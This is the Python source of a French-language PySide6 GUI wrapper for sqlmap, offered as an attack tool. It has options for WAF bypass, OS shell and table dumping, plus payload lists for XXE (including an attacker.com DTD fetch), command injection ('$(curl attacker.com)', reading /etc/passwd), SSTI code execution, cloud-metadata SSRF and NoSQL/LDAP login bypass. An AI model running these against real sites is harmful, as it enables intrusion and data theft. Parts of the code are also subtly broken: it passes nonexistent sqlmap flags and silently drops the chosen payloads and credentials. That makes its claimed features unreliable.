#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
SQLMAP ULTIME GUI ULTIME - JATHNIEL EDITION
Interface graphique professionnelle pour sqlmap
Avec toutes les injections avancées: JSON, GraphQL, XXE, NoSQL, LDAP, Command, SSTI, SSRF
Usage académique et légal uniquement
"""

import sys
import os
import json
import time
import threading
import subprocess
import re
from datetime import datetime
from pathlib import Path
from typing import Optional, Dict, List, Any
import urllib.parse

try:
    from PySide6.QtWidgets import *
    from PySide6.QtCore import *
    from PySide6.QtGui import *
    QT_AVAILABLE = True
except ImportError:
    QT_AVAILABLE = False
    print("[!] PySide6 non installé. Installation...")
    os.system("pip install PySide6")
    try:
        from PySide6.QtWidgets import *
        from PySide6.QtCore import *
        from PySide6.QtGui import *
        QT_AVAILABLE = True
    except:
        print("[!] Erreur: PySide6 requis. Installez avec: pip install PySide6")
        sys.exit(1)

# ==================== CONFIGURATION ====================

CONFIG = {
    'title': 'SQLMAP ULTIME GUI ULTIME - JATHNIEL EDITION',
    'version': '3.0',
    'author': 'JATHNIEL'
}

# ==================== PAYLOADS ====================

PAYLOADS = {
    'json': [
        '{"username": "admin", "password": "123456"}',
        '{"username": {"$ne": null}, "password": "admin"}',
        '{"username": "admin\' OR \'1\'=\'1"}',
        '{"username": {"$regex": ".*"}}'
    ],
    'graphql': [
        '{ __schema { types { name } } }',
        'query { user(id: "1\' OR \'1\'=\'1") { name } }',
        'mutation { login(username: "admin", password: "123\' OR \'1\'=\'1") { token } }'
    ],
    'xxe': [
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>',
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % remote SYSTEM "http://attacker.com/evil.dtd">%remote;]><root/>'
    ],
    'nosql': [
        '{"username": {"$ne": null}}',
        '{"username": {"$gt": ""}}',
        '{"username": {"$regex": ".*"}}',
        '{"$where": "this.password.length > 0"}'
    ],
    'ldap': [
        '(&(user=admin)(password=*))',
        '(|(user=admin)(user=*))'
    ],
    'command': [
        '; ls -la',
        '| whoami',
        '& id',
        '`cat /etc/passwd`',
        '$(curl attacker.com)'
    ],
    'ssti': {
        'jinja2': [
            '{{ 7*7 }}',
            '{{ config.items() }}',
            '{{ self.__class__.__mro__[1].__subclasses__() }}'
        ],
        'twig': [
            '{{ 7*7 }}',
            '{{ _self.env.registerUndefinedFilterCallback("exec") }}'
        ],
        'velocity': [
            '#set($x=7*7) $x',
            '#set($x="").getClass().forName("java.lang.Runtime").getRuntime().exec("id")'
        ]
    },
    'ssrf': [
        'http://169.254.169.254/latest/meta-data/',
        'http://metadata.google.internal/computeMetadata/v1/',
        'http://localhost:8080/admin',
        'file:///etc/passwd',
        'gopher://localhost:8080/_GET /admin HTTP/1.0'
    ]
}

# ==================== WAF SIGNATURES ====================

WAF_SIGNATURES = {
    'Cloudflare': ['cf-ray', '__cfduid', 'cloudflare'],
    'AWS WAF': ['x-amzn-requestid', 'aws-waf'],
    'ModSecurity': ['mod_security', 'ModSecurity'],
    'Imperva': ['incap_ses', 'visid_incap'],
    'Akamai': ['akamai', 'x-akamai'],
    'Sucuri': ['sucuri', 'sucuri-'],
    'Barracuda': ['barracuda', 'cuda']
}

# ==================== SQLMAP WRAPPER ====================

class SQLMapWrapper(QObject):
    """Wrapper pour sqlmap avec signaux"""
    
    output_received = Signal(str)
    scan_finished = Signal(str)
    status_changed = Signal(str)
    
    def __init__(self):
        super().__init__()
        self.process = None
        self.running = False
        self.results = []
        
    def start_scan(self, params: Dict):
        """Démarre un scan sqlmap"""
        if self.running:
            return
        
        self.running = True
        self.results = []
        
        cmd = self.build_command(params)
        self.status_changed.emit(f"🚀 Scan démarré: {' '.join(cmd)}")
        
        threading.Thread(target=self.run_scan, args=(cmd,), daemon=True).start()
    
    def build_command(self, params: Dict) -> List[str]:
        """Construit la commande sqlmap"""
        cmd = ["sqlmap"]
        
        if params.get('url'):
            cmd.extend(["-u", params['url']])
        
        if params.get('method') == 'POST' and params.get('data'):
            cmd.extend(["--data", params['data']])
        
        cmd.extend(["--level", str(params.get('level', 3))])
        cmd.extend(["--risk", str(params.get('risk', 2))])
        
        if params.get('techniques'):
            cmd.extend(["--technique", params.get('techniques')])
        
        cmd.extend(["--threads", str(params.get('threads', 5))])
        cmd.extend(["--timeout", str(params.get('timeout', 30))])
        
        if params.get('delay', 0) > 0:
            cmd.extend(["--delay", str(params['delay'])])
        
        if params.get('batch', True):
            cmd.append("--batch")
        
        if params.get('smart', False):
            cmd.append("--smart")
        
        if params.get('random_agent', True):
            cmd.append("--random-agent")
        
        if params.get('proxy'):
            cmd.extend(["--proxy", params['proxy']])
        
        if params.get('tamper'):
            cmd.extend(["--tamper", ",".join(params['tamper'])])
        
        if params.get('headers'):
            for key, value in params['headers'].items():
                cmd.extend(["--header", f"{key}: {value}"])
        
        if params.get('cookies'):
            cmd.extend(["--cookie", params['cookies']])
        
        if params.get('user_agent'):
            cmd.extend(["--user-agent", params['user_agent']])
        
        # Options avancées
        if params.get('json_injection'):
            cmd.append("--json")
        
        if params.get('graphql_injection'):
            cmd.append("--graphql")
        
        if params.get('nosql_injection'):
            cmd.append("--nosql")
        
        if params.get('waf_bypass'):
            cmd.extend(["--tamper", "space2comment,randomcase,equaltolike"])
        
        if params.get('os_shell'):
            cmd.append("--os-shell")
        
        if params.get('dbs'):
            cmd.append("--dbs")
        
        if params.get('tables') and params.get('database'):
            cmd.extend(["-D", params['database'], "--tables"])
        
        if params.get('columns') and params.get('database') and params.get('table'):
            cmd.extend(["-D", params['database'], "-T", params['table'], "--columns"])
        
        if params.get('dump') and params.get('database') and params.get('table'):
            cmd.extend(["-D", params['database'], "-T", params['table'], "--dump"])
        
        return cmd
    
    def run_scan(self, cmd: List[str]):
        """Exécute le scan dans un thread"""
        try:
            self.process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True,
                bufsize=1
            )
            
            while self.running and self.process:
                line = self.process.stdout.readline()
                if not line:
                    break
                
                line = line.strip()
                if line:
                    self.output_received.emit(line)
                    self.parse_output(line)
            
            self.running = False
            self.status_changed.emit("✅ Scan terminé")
            self.scan_finished.emit("Scan terminé")
            
        except Exception as e:
            self.output_received.emit(f"❌ Erreur: {e}")
            self.running = False
    
    def parse_output(self, line: str):
        """Parse la sortie sqlmap"""
        if "vulnerable" in line.lower():
            self.status_changed.emit("🚨 Vulnérabilité détectée!")
            self.results.append(line)
        elif "Database:" in line:
            self.status_changed.emit(f"🗄️ {line}")
        elif "Table:" in line:
            self.status_changed.emit(f"📋 {line}")
        elif "WAF" in line:
            self.status_changed.emit(f"🛡️ {line}")
    
    def stop_scan(self):
        """Arrête le scan"""
        self.running = False
        if self.process:
            self.process.terminate()
            self.status_changed.emit("⏹️ Scan arrêté")

# ==================== INTERFACE PRINCIPALE ====================

class SQLMapGUI(QMainWindow):
    """Interface graphique principale"""
    
    def __init__(self):
        super().__init__()
        self.wrapper = SQLMapWrapper()
        self.current_scan = None
        self.setup_ui()
        self.connect_signals()
        
        self.config = {
            'level': 3,
            'risk': 2,
            'techniques': 'BEUSTQ',
            'threads': 5,
            'timeout': 30,
            'delay': 0.5,
            'batch': True,
            'smart': False,
            'random_agent': True,
        }
    
    def setup_ui(self):
        """Configure l'interface"""
        self.setWindowTitle(CONFIG['title'])
        self.setGeometry(100, 100, 1400, 850)
        self.setStyleSheet("""
            QMainWindow { background-color: #1a1a2e; }
            QWidget { background-color: #1a1a2e; color: #e0e0e0; font-family: 'Segoe UI', Arial, sans-serif; }
            QPushButton {
                background-color: #2d2d44;
                color: #e0e0e0;
                border: 1px solid #4a4a6a;
                border-radius: 6px;
                padding: 8px 16px;
                font-weight: bold;
            }
            QPushButton:hover { background-color: #3d3d5a; }
            QPushButton#danger { background-color: #6a2d2d; border-color: #8a3d3d; }
            QPushButton#danger:hover { background-color: #8a3d3d; }
            QPushButton#success { background-color: #2d6a2d; border-color: #3d8a3d; }
            QPushButton#success:hover { background-color: #3d8a3d; }
            QPushButton#primary { background-color: #2d2d6a; border-color: #3d3d8a; }
            QPushButton#primary:hover { background-color: #3d3d8a; }
            QLineEdit, QTextEdit, QComboBox {
                background-color: #0d0d1a;
                border: 1px solid #2d2d44;
                border-radius: 6px;
                padding: 8px;
                color: #e0e0e0;
                font-family: 'Consolas', monospace;
            }
            QTextEdit {
                font-family: 'Consolas', monospace;
                font-size: 12px;
            }
            QTabWidget::pane {
                border: 1px solid #2d2d44;
                border-radius: 6px;
                background-color: #1a1a2e;
            }
            QTabBar::tab {
                background-color: #2d2d44;
                padding: 8px 16px;
                margin-right: 2px;
                border-top-left-radius: 4px;
                border-top-right-radius: 4px;
            }
            QTabBar::tab:selected { background-color: #3d3d5a; }
            QStatusBar { background-color: #0d0d1a; color: #8888aa; }
            QGroupBox {
                border: 1px solid #2d2d44;
                border-radius: 6px;
                margin-top: 10px;
                padding-top: 10px;
            }
            QGroupBox::title {
                color: #00ff88;
                subcontrol-origin: margin;
                left: 10px;
            }
            QLabel { color: #e0e0e0; }
            QProgressBar {
                background-color: #0d0d1a;
                border: 1px solid #2d2d44;
                border-radius: 6px;
                text-align: center;
                color: #e0e0e0;
                height: 20px;
            }
            QProgressBar::chunk {
                background-color: #4F46E5;
                border-radius: 6px;
            }
            QTableWidget {
                background-color: #0d0d1a;
                border: 1px solid #2d2d44;
                border-radius: 6px;
                gridline-color: #2d2d44;
            }
            QTableWidget::item { color: #e0e0e0; }
            QHeaderView::section {
                background-color: #2d2d44;
                padding: 8px;
                border: none;
                color: #00ff88;
            }
            QCheckBox { color: #e0e0e0; }
            QSpinBox, QDoubleSpinBox { color: #e0e0e0; background-color: #0d0d1a; border: 1px solid #2d2d44; border-radius: 4px; padding: 4px; }
        """)
        
        central = QWidget()
        self.setCentralWidget(central)
        layout = QVBoxLayout(central)
        layout.setContentsMargins(10, 10, 10, 10)
        
        # Header
        header = QLabel(f"🔍 SQLMAP ULTIME GUI ULTIME - {CONFIG['author']}")
        header.setStyleSheet("font-size: 20px; font-weight: bold; color: #00ff88; padding: 10px;")
        header.setAlignment(Qt.AlignmentFlag.AlignCenter)
        layout.addWidget(header)
        
        # Tabs
        self.tabs = QTabWidget()
        
        self.config_tab = self.create_config_tab()
        self.tabs.addTab(self.config_tab, "⚙️ Configuration")
        
        self.injection_tab = self.create_injection_tab()
        self.tabs.addTab(self.injection_tab, "💉 Injection Avancée")
        
        self.waf_tab = self.create_waf_tab()
        self.tabs.addTab(self.waf_tab, "🛡️ WAF Bypass")
        
        self.console_tab = self.create_console_tab()
        self.tabs.addTab(self.console_tab, "📟 Console")
        
        self.results_tab = self.create_results_tab()
        self.tabs.addTab(self.results_tab, "📊 Résultats")
        
        layout.addWidget(self.tabs)
        
        self.status_bar = QStatusBar()
        self.setStatusBar(self.status_bar)
        self.status_bar.showMessage("✅ Prêt")
    
    def create_config_tab(self):
        """Crée l'onglet de configuration"""
        tab = QWidget()
        layout = QVBoxLayout(tab)
        
        # URL
        url_group = QGroupBox("🎯 Cible")
        url_layout = QGridLayout()
        
        url_layout.addWidget(QLabel("URL:"), 0, 0)
        self.url_input = QLineEdit()
        self.url_input.setPlaceholderText("https://example.com/page?id=1")
        url_layout.addWidget(self.url_input, 0, 1, 1, 3)
        
        url_layout.addWidget(QLabel("Méthode:"), 1, 0)
        self.method_combo = QComboBox()
        self.method_combo.addItems(["GET", "POST"])
        url_layout.addWidget(self.method_combo, 1, 1)
        
        url_layout.addWidget(QLabel("Données POST:"), 2, 0)
        self.post_data = QLineEdit()
        self.post_data.setPlaceholderText("param1=value1&param2=value2")
        self.post_data.setEnabled(False)
        url_layout.addWidget(self.post_data, 2, 1, 1, 3)
        
        self.method_combo.currentTextChanged.connect(
            lambda text: self.post_data.setEnabled(text == "POST")
        )
        
        url_group.setLayout(url_layout)
        layout.addWidget(url_group)
        
        # Authentification
        auth_group = QGroupBox("🔐 Authentification")
        auth_layout = QGridLayout()
        
        auth_layout.addWidget(QLabel("Type:"), 0, 0)
        self.auth_combo = QComboBox()
        self.auth_combo.addItems(["Aucune", "Basic", "Digest"])
        auth_layout.addWidget(self.auth_combo, 0, 1)
        
        auth_layout.addWidget(QLabel("Identifiant:"), 1, 0)
        self.auth_user = QLineEdit()
        self.auth_user.setPlaceholderText("Utilisateur")
        auth_layout.addWidget(self.auth_user, 1, 1)
        
        auth_layout.addWidget(QLabel("Mot de passe:"), 2, 0)
        self.auth_pass = QLineEdit()
        self.auth_pass.setPlaceholderText("Mot de passe")
        self.auth_pass.setEchoMode(QLineEdit.EchoMode.Password)
        auth_layout.addWidget(self.auth_pass, 2, 1)
        
        auth_group.setLayout(auth_layout)
        layout.addWidget(auth_group)
        
        # Headers
        headers_group = QGroupBox("📋 Headers")
        headers_layout = QVBoxLayout()
        
        self.headers_table = QTableWidget(0, 2)
        self.headers_table.setHorizontalHeaderLabels(["Clé", "Valeur"])
        headers_layout.addWidget(self.headers_table)
        
        btn_layout = QHBoxLayout()
        add_btn = QPushButton("➕ Ajouter")
        add_btn.clicked.connect(self.add_header)
        btn_layout.addWidget(add_btn)
        
        remove_btn = QPushButton("➖ Supprimer")
        remove_btn.clicked.connect(self.remove_header)
        btn_layout.addWidget(remove_btn)
        btn_layout.addStretch()
        
        headers_layout.addLayout(btn_layout)
        headers_group.setLayout(headers_layout)
        layout.addWidget(headers_group)
        
        # Options
        options_group = QGroupBox("⚙️ Options Avancées")
        options_layout = QGridLayout()
        
        options_layout.addWidget(QLabel("Niveau:"), 0, 0)
        self.level_spin = QSpinBox()
        self.level_spin.setRange(1, 5)
        self.level_spin.setValue(3)
        options_layout.addWidget(self.level_spin, 0, 1)
        
        options_layout.addWidget(QLabel("Risque:"), 1, 0)
        self.risk_spin = QSpinBox()
        self.risk_spin.setRange(1, 3)
        self.risk_spin.setValue(2)
        options_layout.addWidget(self.risk_spin, 1, 1)
        
        options_layout.addWidget(QLabel("Threads:"), 2, 0)
        self.threads_spin = QSpinBox()
        self.threads_spin.setRange(1, 20)
        self.threads_spin.setValue(5)
        options_layout.addWidget(self.threads_spin, 2, 1)
        
        options_layout.addWidget(QLabel("Timeout:"), 3, 0)
        self.timeout_spin = QSpinBox()
        self.timeout_spin.setRange(5, 120)
        self.timeout_spin.setValue(30)
        options_layout.addWidget(self.timeout_spin, 3, 1)
        
        options_layout.addWidget(QLabel("Délai:"), 4, 0)
        self.delay_spin = QDoubleSpinBox()
        self.delay_spin.setRange(0, 10)
        self.delay_spin.setSingleStep(0.5)
        self.delay_spin.setValue(0.5)
        options_layout.addWidget(self.delay_spin, 4, 1)
        
        options_group.setLayout(options_layout)
        layout.addWidget(options_group)
        
        # Techniques
        tech_group = QGroupBox("💉 Techniques")
        tech_layout = QHBoxLayout()
        
        self.tech_checkboxes = {}
        techniques = [
            ("B", "Boolean"),
            ("E", "Error"),
            ("U", "Union"),
            ("S", "Stacked"),
            ("T", "Time"),
            ("Q", "Inline")
        ]
        
        for key, label in techniques:
            cb = QCheckBox(label)
            cb.setChecked(True)
            tech_layout.addWidget(cb)
            self.tech_checkboxes[key] = cb
        
        tech_group.setLayout(tech_layout)
        layout.addWidget(tech_group)
        
        # Tamper
        tamper_group = QGroupBox("🎭 Tamper Scripts")
        tamper_layout = QVBoxLayout()
        
        self.tamper_combo = QComboBox()
        self.tamper_combo.setEditable(True)
        self.tamper_combo.addItems([
            "apostrophemask", "apostrophenullencode", "between",
            "chardoubleencode", "charencode", "equaltolike",
            "randomcase", "randomcomments", "space2comment",
            "space2dash", "space2hash"
        ])
        tamper_layout.addWidget(self.tamper_combo)
        
        tamper_group.setLayout(tamper_layout)
        layout.addWidget(tamper_group)
        
        # Boutons
        btn_layout = QHBoxLayout()
        
        self.scan_btn = QPushButton("🚀 Lancer le Scan")
        self.scan_btn.setObjectName("success")
        self.scan_btn.clicked.connect(self.start_scan)
        btn_layout.addWidget(self.scan_btn)
        
        self.stop_btn = QPushButton("⏹️ Arrêter")
        self.stop_btn.setObjectName("danger")
        self.stop_btn.clicked.connect(self.stop_scan)
        self.stop_btn.setEnabled(False)
        btn_layout.addWidget(self.stop_btn)
        
        self.clear_btn = QPushButton("🧹 Effacer")
        self.clear_btn.clicked.connect(self.clear_console)
        btn_layout.addWidget(self.clear_btn)
        
        btn_layout.addStretch()
        layout.addLayout(btn_layout)
        
        layout.addStretch()
        return tab
    
    def create_injection_tab(self):
        """Crée l'onglet d'injection avancée"""
        tab = QWidget()
        layout = QVBoxLayout(tab)
        
        # JSON Injection
        json_group = QGroupBox("📦 JSON Injection")
        json_layout = QVBoxLayout()
        self.json_check = QCheckBox("Activer JSON Injection")
        json_layout.addWidget(self.json_check)
        
        json_payload_label = QLabel("Payloads JSON:")
        json_layout.addWidget(json_payload_label)
        self.json_payload = QComboBox()
        self.json_payload.addItems(PAYLOADS['json'])
        self.json_payload.setEditable(True)
        json_layout.addWidget(self.json_payload)
        
        json_group.setLayout(json_layout)
        layout.addWidget(json_group)
        
        # GraphQL Injection
        graphql_group = QGroupBox("📊 GraphQL Injection")
        graphql_layout = QVBoxLayout()
        self.graphql_check = QCheckBox("Activer GraphQL Injection")
        graphql_layout.addWidget(self.graphql_check)
        
        graphql_payload_label = QLabel("Payloads GraphQL:")
        graphql_layout.addWidget(graphql_payload_label)
        self.graphql_payload = QComboBox()
        self.graphql_payload.addItems(PAYLOADS['graphql'])
        self.graphql_payload.setEditable(True)
        graphql_layout.addWidget(self.graphql_payload)
        
        graphql_group.setLayout(graphql_layout)
        layout.addWidget(graphql_group)
        
        # XXE Injection
        xxe_group = QGroupBox("📄 XXE Injection")
        xxe_layout = QVBoxLayout()
        self.xxe_check = QCheckBox("Activer XXE Injection")
        xxe_layout.addWidget(self.xxe_check)
        
        xxe_payload_label = QLabel("Payloads XXE:")
        xxe_layout.addWidget(xxe_payload_label)
        self.xxe_payload = QComboBox()
        self.xxe_payload.addItems(PAYLOADS['xxe'])
        self.xxe_payload.setEditable(True)
        xxe_layout.addWidget(self.xxe_payload)
        
        xxe_group.setLayout(xxe_layout)
        layout.addWidget(xxe_group)
        
        # NoSQL Injection
        nosql_group = QGroupBox("🍃 NoSQL Injection")
        nosql_layout = QVBoxLayout()
        self.nosql_check = QCheckBox("Activer NoSQL Injection")
        nosql_layout.addWidget(self.nosql_check)
        
        nosql_payload_label = QLabel("Payloads NoSQL:")
        nosql_layout.addWidget(nosql_payload_label)
        self.nosql_payload = QComboBox()
        self.nosql_payload.addItems(PAYLOADS['nosql'])
        self.nosql_payload.setEditable(True)
        nosql_layout.addWidget(self.nosql_payload)
        
        nosql_group.setLayout(nosql_layout)
        layout.addWidget(nosql_group)
        
        # LDAP Injection
        ldap_group = QGroupBox("🔐 LDAP Injection")
        ldap_layout = QVBoxLayout()
        self.ldap_check = QCheckBox("Activer LDAP Injection")
        ldap_layout.addWidget(self.ldap_check)
        
        ldap_payload_label = QLabel("Payloads LDAP:")
        ldap_layout.addWidget(ldap_payload_label)
        self.ldap_payload = QComboBox()
        self.ldap_payload.addItems(PAYLOADS['ldap'])
        self.ldap_payload.setEditable(True)
        ldap_layout.addWidget(self.ldap_payload)
        
        ldap_group.setLayout(ldap_layout)
        layout.addWidget(ldap_group)
        
        # Command Injection
        cmd_group = QGroupBox("⌨️ Command Injection")
        cmd_layout = QVBoxLayout()
        self.cmd_check = QCheckBox("Activer Command Injection")
        cmd_layout.addWidget(self.cmd_check)
        
        cmd_payload_label = QLabel("Payloads Command:")
        cmd_layout.addWidget(cmd_payload_label)
        self.cmd_payload = QComboBox()
        self.cmd_payload.addItems(PAYLOADS['command'])
        self.cmd_payload.setEditable(True)
        cmd_layout.addWidget(self.cmd_payload)
        
        cmd_group.setLayout(cmd_layout)
        layout.addWidget(cmd_group)
        
        # SSTI Injection
        ssti_group = QGroupBox("🧩 SSTI Injection")
        ssti_layout = QVBoxLayout()
        self.ssti_check = QCheckBox("Activer SSTI Injection")
        ssti_layout.addWidget(self.ssti_check)
        
        ssti_engine_label = QLabel("Moteur de template:")
        ssti_layout.addWidget(ssti_engine_label)
        self.ssti_engine = QComboBox()
        self.ssti_engine.addItems(["jinja2", "twig", "velocity"])
        ssti_layout.addWidget(self.ssti_engine)
        
        ssti_payload_label = QLabel("Payloads SSTI:")
        ssti_layout.addWidget(ssti_payload_label)
        self.ssti_payload = QComboBox()
        self.ssti_payload.setEditable(True)
        self.ssti_engine.currentTextChanged.connect(self.update_ssti_payloads)
        self.update_ssti_payloads("jinja2")
        ssti_layout.addWidget(self.ssti_payload)
        
        ssti_group.setLayout(ssti_layout)
        layout.addWidget(ssti_group)
        
        # SSRF Injection
        ssrf_group = QGroupBox("🌐 SSRF Injection")
        ssrf_layout = QVBoxLayout()
        self.ssrf_check = QCheckBox("Activer SSRF Injection")
        ssrf_layout.addWidget(self.ssrf_check)
        
        ssrf_payload_label = QLabel("Payloads SSRF:")
        ssrf_layout.addWidget(ssrf_payload_label)
        self.ssrf_payload = QComboBox()
        self.ssrf_payload.addItems(PAYLOADS['ssrf'])
        self.ssrf_payload.setEditable(True)
        ssrf_layout.addWidget(self.ssrf_payload)
        
        ssrf_group.setLayout(ssrf_layout)
        layout.addWidget(ssrf_group)
        
        layout.addStretch()
        return tab
    
    def update_ssti_payloads(self, engine):
        """Met à jour les payloads SSTI selon le moteur"""
        self.ssti_payload.clear()
        if engine in PAYLOADS['ssti']:
            self.ssti_payload.addItems(PAYLOADS['ssti'][engine])
    
    def create_waf_tab(self):
        """Crée l'onglet WAF Bypass"""
        tab = QWidget()
        layout = QVBoxLayout(tab)
        
        waf_group = QGroupBox("🛡️ WAF Detection & Bypass")
        waf_layout = QGridLayout()
        
        waf_layout.addWidget(QLabel("Détection WAF:"), 0, 0)
        self.waf_detect = QComboBox()
        self.waf_detect.addItems(["Auto", "Cloudflare", "AWS WAF", "ModSecurity", "Imperva", "Akamai", "Sucuri", "Barracuda"])
        waf_layout.addWidget(self.waf_detect, 0, 1)
        
        waf_layout.addWidget(QLabel("Techniques de bypass:"), 1, 0)
        self.waf_bypass_check = QCheckBox("Activer WAF Bypass")
        self.waf_bypass_check.setChecked(True)
        waf_layout.addWidget(self.waf_bypass_check, 1, 1)
        
        bypass_techniques = QGroupBox("Techniques:")
        bypass_layout = QVBoxLayout()
        
        self.bypass_comment = QCheckBox("Comment Injection (/**/)")
        self.bypass_comment.setChecked(True)
        bypass_layout.addWidget(self.bypass_comment)
        
        self.bypass_encoding = QCheckBox("Encodage (URL/Base64)")
        self.bypass_encoding.setChecked(True)
        bypass_layout.addWidget(self.bypass_encoding)
        
        self.bypass_case = QCheckBox("Case Variation (UnIoN)")
        self.bypass_case.setChecked(True)
        bypass_layout.addWidget(self.bypass_case)
        
        self.bypass_fragmentation = QCheckBox("Fragmentation (UN/**/ION)")
        self.bypass_fragmentation.setChecked(True)
        bypass_layout.addWidget(self.bypass_fragmentation)
        
        bypass_techniques.setLayout(bypass_layout)
        waf_layout.addWidget(bypass_techniques, 2, 0, 1, 2)
        
        waf_group.setLayout(waf_layout)
        layout.addWidget(waf_group)
        
        # Extraction
        extract_group = QGroupBox("🗄️ Extraction")
        extract_layout = QGridLayout()
        
        extract_layout.addWidget(QLabel("Base de données:"), 0, 0)
        self.extract_db = QLineEdit()
        self.extract_db.setPlaceholderText("nom_base")
        extract_layout.addWidget(self.extract_db, 0, 1)
        
        extract_layout.addWidget(QLabel("Table:"), 1, 0)
        self.extract_table = QLineEdit()
        self.extract_table.setPlaceholderText("nom_table")
        extract_layout.addWidget(self.extract_table, 1, 1)
        
        extract_layout.addWidget(QLabel("Colonne:"), 2, 0)
        self.extract_column = QLineEdit()
        self.extract_column.setPlaceholderText("nom_colonne")
        extract_layout.addWidget(self.extract_column, 2, 1)
        
        extract_group.setLayout(extract_layout)
        layout.addWidget(extract_group)
        
        layout.addStretch()
        return tab
    
    def create_console_tab(self):
        """Crée l'onglet console"""
        tab = QWidget()
        layout = QVBoxLayout(tab)
        
        self.console = QTextEdit()
        self.console.setReadOnly(True)
        self.console.setFontFamily("Consolas")
        self.console.setFontPointSize(10)
        layout.addWidget(self.console)
        
        return tab
    
    def create_results_tab(self):
        """Crée l'onglet résultats"""
        tab = QWidget()
        layout = QVBoxLayout(tab)
        
        stats_group = QGroupBox("📊 Statistiques")
        stats_layout = QGridLayout()
        
        self.stats_labels = {}
        stats_items = [
            ("Vulnérabilités:", "vulns", "0"),
            ("Bases de données:", "dbs", "0"),
            ("Tables:", "tables", "0"),
            ("Colonnes:", "columns", "0"),
            ("WAF détecté:", "waf", "Inconnu")
        ]
        
        for i, (label, key, default) in enumerate(stats_items):
            stats_layout.addWidget(QLabel(label), i, 0)
            lbl = QLabel(default)
            lbl.setStyleSheet("color: #00ff88; font-weight: bold; font-size: 14px;")
            stats_layout.addWidget(lbl, i, 1)
            self.stats_labels[key] = lbl
        
        stats_group.setLayout(stats_layout)
        layout.addWidget(stats_group)
        
        self.results_tree = QTreeWidget()
        self.results_tree.setHeaderLabel("Résultats du Scan")
        layout.addWidget(self.results_tree)
        
        return tab
    
    def connect_signals(self):
        """Connecte les signaux"""
        self.wrapper.output_received.connect(self.append_console)
        self.wrapper.status_changed.connect(self.update_status)
        self.wrapper.scan_finished.connect(self.on_scan_finished)
    
    def add_header(self):
        """Ajoute un header"""
        row = self.headers_table.rowCount()
        self.headers_table.insertRow(row)
        self.headers_table.setItem(row, 0, QTableWidgetItem(""))
        self.headers_table.setItem(row, 1, QTableWidgetItem(""))
    
    def remove_header(self):
        """Supprime un header"""
        row = self.headers_table.currentRow()
        if row >= 0:
            self.headers_table.removeRow(row)
    
    def get_injection_params(self):
        """Récupère les paramètres d'injection"""
        params = {}
        
        if self.json_check.isChecked():
            params['json_injection'] = True
            params['json_payload'] = self.json_payload.currentText()
        
        if self.graphql_check.isChecked():
            params['graphql_injection'] = True
            params['graphql_payload'] = self.graphql_payload.currentText()
        
        if self.xxe_check.isChecked():
            params['xxe_injection'] = True
            params['xxe_payload'] = self.xxe_payload.currentText()
        
        if self.nosql_check.isChecked():
            params['nosql_injection'] = True
            params['nosql_payload'] = self.nosql_payload.currentText()
        
        if self.ldap_check.isChecked():
            params['ldap_injection'] = True
            params['ldap_payload'] = self.ldap_payload.currentText()
        
        if self.cmd_check.isChecked():
            params['cmd_injection'] = True
            params['cmd_payload'] = self.cmd_payload.currentText()
        
        if self.ssti_check.isChecked():
            params['ssti_injection'] = True
            params['ssti_engine'] = self.ssti_engine.currentText()
            params['ssti_payload'] = self.ssti_payload.currentText()
        
        if self.ssrf_check.isChecked():
            params['ssrf_injection'] = True
            params['ssrf_payload'] = self.ssrf_payload.currentText()
        
        if self.waf_bypass_check.isChecked():
            params['waf_bypass'] = True
            params['waf_type'] = self.waf_detect.currentText()
        
        # Extraction
        if self.extract_db.text().strip():
            params['database'] = self.extract_db.text().strip()
            params['tables'] = True
        
        if self.extract_table.text().strip() and params.get('database'):
            params['table'] = self.extract_table.text().strip()
            params['columns'] = True
        
        return params
    
    def start_scan(self):
        """Démarre le scan"""
        params = {
            'url': self.url_input.text().strip(),
            'method': self.method_combo.currentText(),
            'data': self.post_data.text().strip(),
            'level': self.level_spin.value(),
            'risk': self.risk_spin.value(),
            'techniques': ''.join(k for k, cb in self.tech_checkboxes.items() if cb.isChecked()),
            'threads': self.threads_spin.value(),
            'timeout': self.timeout_spin.value(),
            'delay': self.delay_spin.value(),
            'batch': True,
            'smart': False,
            'random_agent': True,
            'tamper': [self.tamper_combo.currentText()] if self.tamper_combo.currentText() else [],
        }
        
        # Headers
        headers = {}
        for row in range(self.headers_table.rowCount()):
            key_item = self.headers_table.item(row, 0)
            value_item = self.headers_table.item(row, 1)
            if key_item and value_item:
                key = key_item.text().strip()
                value = value_item.text().strip()
                if key and value:
                    headers[key] = value
        
        if headers:
            params['headers'] = headers
        
        # Auth
        auth_type = self.auth_combo.currentText()
        if auth_type != "Aucune":
            user = self.auth_user.text().strip()
            password = self.auth_pass.text().strip()
            if user and password:
                params['auth'] = f"{auth_type.lower()} {user}:{password}"
        
        # Injections
        injection_params = self.get_injection_params()
        params.update(injection_params)
        
        if not params['url']:
            self.append_console("❌ Veuillez entrer une URL")
            return
        
        self.scan_btn.setEnabled(False)
        self.stop_btn.setEnabled(True)
        self.status_bar.showMessage("📡 Scan en cours...")
        self.append_console(f"🚀 Démarrage du scan sur {params['url']}")
        
        if params.get('json_injection'):
            self.append_console(f"📦 JSON Injection activée")
        if params.get('graphql_injection'):
            self.append_console(f"📊 GraphQL Injection activée")
        if params.get('xxe_injection'):
            self.append_console(f"📄 XXE Injection activée")
        if params.get('nosql_injection'):
            self.append_console(f"🍃 NoSQL Injection activée")
        if params.get('waf_bypass'):
            self.append_console(f"🛡️ WAF Bypass activé: {params.get('waf_type', 'Auto')}")
        
        self.wrapper.start_scan(params)
    
    def stop_scan(self):
        """Arrête le scan"""
        self.wrapper.stop_scan()
        self.scan_btn.setEnabled(True)
        self.stop_btn.setEnabled(False)
        self.status_bar.showMessage("⏹️ Scan arrêté")
        self.append_console("⏹️ Scan arrêté par l'utilisateur")
    
    def append_console(self, text):
        """Ajoute du texte à la console"""
        self.console.append(text)
        self.console.verticalScrollBar().setValue(
            self.console.verticalScrollBar().maximum()
        )
    
    def update_status(self, status):
        """Met à jour le statut"""
        self.status_bar.showMessage(f"📡 {status}")
        if "terminé" in status.lower() or "arrêté" in status.lower():
            self.scan_btn.setEnabled(True)
            self.stop_btn.setEnabled(False)
    
    def clear_console(self):
        """Efface la console"""
        self.console.clear()
    
    def on_scan_finished(self, message):
        """Gère la fin du scan"""
        self.append_console(f"✅ {message}")
        self.scan_btn.setEnabled(True)
